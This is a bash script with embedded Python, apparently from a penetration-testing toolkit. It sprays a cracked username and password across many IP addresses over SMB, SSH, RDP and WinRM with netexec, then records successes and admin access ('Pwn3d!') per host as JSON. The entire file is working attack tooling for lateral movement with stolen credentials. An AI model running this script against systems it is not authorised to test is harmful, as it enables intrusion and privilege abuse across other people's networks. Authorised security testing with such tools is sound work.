#!/bin/bash
# Credential Spray — tests a cracked credential against multiple hosts using netexec
# Usage: cred_spray.sh <output_json_path> <username> <password> <domain> <IP> [IP] ...
# Produces structured JSON with spray results per host/protocol

OUTPUT_FILE="${1:?Usage: cred_spray.sh <output_json> <username> <password> <domain> <IP> [IP ...]}"
USERNAME="${2:?Missing username}"
PASSWORD="${3:?Missing password}"
DOMAIN="${4:?Missing domain (use WORKGROUP if none)}"
shift 4
TARGETS="$@"

if [ -z "$TARGETS" ]; then
    echo '{"targets": {}, "spray_time": "'$(date -u +%Y-%m-%dT%H:%M:%SZ)'", "error": "No targets specified"}' > "$OUTPUT_FILE"
    exit 0
fi

TMPDIR=$(mktemp -d /tmp/cred_spray_XXXXXX)
trap 'rm -rf "$TMPDIR"' EXIT

echo "[*] Credential spray starting — user: $USERNAME, domain: $DOMAIN, targets: $TARGETS"

# --- SMB spray (primary — port 445) ---
echo "[*] Spraying SMB..."
timeout 60 netexec smb $TARGETS -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" --no-bruteforce 2>/dev/null | tee "$TMPDIR/smb_output.txt"

# --- SSH spray (if any targets have port 22) ---
echo "[*] Spraying SSH..."
timeout 60 netexec ssh $TARGETS -u "$USERNAME" -p "$PASSWORD" --no-bruteforce 2>/dev/null | tee "$TMPDIR/ssh_output.txt"

# --- RDP spray ---
echo "[*] Spraying RDP..."
timeout 60 netexec rdp $TARGETS -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" --no-bruteforce 2>/dev/null | tee "$TMPDIR/rdp_output.txt"

# --- WinRM spray ---
echo "[*] Spraying WinRM..."
timeout 60 netexec winrm $TARGETS -u "$USERNAME" -p "$PASSWORD" -d "$DOMAIN" --no-bruteforce 2>/dev/null | tee "$TMPDIR/winrm_output.txt"

echo "[*] Parsing results..."

# Parse all netexec output into structured JSON
TMPDIR="$TMPDIR" OUTPUT_FILE="$OUTPUT_FILE" python3 << 'PYEOF'
import re
import json
import os
from datetime import datetime, timezone

tmpdir = os.environ.get('TMPDIR', '/tmp')
output_file = os.environ.get('OUTPUT_FILE', '/tmp/cred_spray_results.json')

results = {
    "targets": {},
    "spray_time": datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ'),
    "total_success": 0,
    "total_failed": 0,
    "total_targets": 0
}

# netexec output format:
# SMB  192.168.0.1  445  HOSTNAME  [+] DOMAIN\user:password (Pwn3d!)
# SMB  192.168.0.1  445  HOSTNAME  [-] DOMAIN\user:password STATUS_LOGON_FAILURE
# SSH  192.168.0.2  22   HOSTNAME  [+] user:password
# Some lines have [*] for info

protocols = {
    'smb': 'smb_output.txt',
    'ssh': 'ssh_output.txt',
    'rdp': 'rdp_output.txt',
    'winrm': 'winrm_output.txt'
}

for proto, filename in protocols.items():
    filepath = os.path.join(tmpdir, filename)
    if not os.path.exists(filepath):
        continue

    with open(filepath, 'r', errors='replace') as f:
        for line in f:
            line = line.strip()
            if not line:
                continue

            # Match netexec result lines: PROTO  IP  PORT  HOSTNAME  [+/-] ...
            m = re.match(r'^\S+\s+(\d+\.\d+\.\d+\.\d+)\s+(\d+)\s+(\S+)\s+\[([+-])\]', line)
            if not m:
                continue

            ip = m.group(1)
            port = m.group(2)
            hostname = m.group(3)
            status = 'success' if m.group(4) == '+' else 'failed'

            # Check for Pwn3d! (admin access)
            admin = '(Pwn3d!)' in line

            if ip not in results['targets']:
                results['targets'][ip] = {
                    'hostname': hostname,
                    'protocols': {}
                }
                results['total_targets'] += 1

            # Update hostname if we got a better one
            if hostname != '*' and results['targets'][ip]['hostname'] == '*':
                results['targets'][ip]['hostname'] = hostname

            results['targets'][ip]['protocols'][proto] = {
                'port': int(port),
                'status': status,
                'admin': admin
            }

            if status == 'success':
                results['total_success'] += 1
            else:
                results['total_failed'] += 1

with open(output_file, 'w') as f:
    json.dump(results, f, indent=2)

total = results['total_targets']
success = results['total_success']
print(f"[+] Credential spray complete: {total} targets, {success} successful authentication(s)")
PYEOF
